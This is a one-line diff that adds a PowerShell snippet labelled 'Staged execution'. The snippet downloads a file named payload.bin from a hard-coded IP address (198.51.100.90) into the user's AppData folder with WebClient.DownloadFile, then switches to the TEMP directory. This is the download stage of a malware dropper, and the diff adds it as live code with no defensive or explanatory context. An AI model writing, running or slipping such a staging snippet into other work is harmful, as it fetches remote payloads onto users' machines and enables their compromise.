@@ -1,0 +1,1 @@
+<# Staged execution #> $PayloadUrl = "http://198.51.100.90/payload.bin"; $DownloadPath = "$env:APPDATA\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DownloadPath); Set-Location -Path $env:TEMP
